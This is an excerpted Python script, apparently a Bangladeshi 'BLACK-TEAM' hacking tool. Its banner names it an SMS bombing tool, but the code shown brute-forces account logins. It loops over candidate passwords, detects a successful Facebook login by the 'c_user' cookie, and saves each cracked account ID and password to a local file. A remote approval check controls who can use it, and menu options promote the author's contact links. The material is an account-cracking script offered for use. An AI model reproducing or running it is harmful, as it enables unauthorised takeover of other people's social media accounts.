...
os.system("xdg-open https://github.com/BLACK-TEAM-24")
logo=("""\033[34m
...
\033[1;33m××××××××××××××××××××××××××××××××××××××××××××××
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m CREATED BY\033[1;33m     ☞  \033[1;32mPROKASH          \033[1;33m  |
...
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m TOOLS NAME\033[1;33m     ☞  \033[1;32mSMS BOMBIG       \033[1;33m  |
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m TOOLS VIRSION\033[1;33m  ☞  \033[1;32m0.7             \033[1;33m   |
××××××××××××××××××××××××××××××××××××××××××××××""")
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801751139233');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100086521818069');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/BLACK-TEAM-24');time.sleep(1)
		admin()
	if bal =='0':
		Main()
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "BLACK-𝐌-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\033[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  ...
  try: 
    httpCaht = requests.get("https://github.com/BLACK-TEAM-24/pro-ok/blob/main/Apruval.txt").text 
    if id in httpCaht: 
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mBLACK\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/BLACK-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[BLACK] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/BLACK-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
